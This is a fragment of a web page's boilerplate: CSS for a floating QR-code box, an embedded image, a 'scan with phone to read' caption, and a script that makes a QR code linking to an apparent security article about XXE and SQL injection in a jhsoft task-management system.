z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-dailytaskmanage-XmlHttp-xxe-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 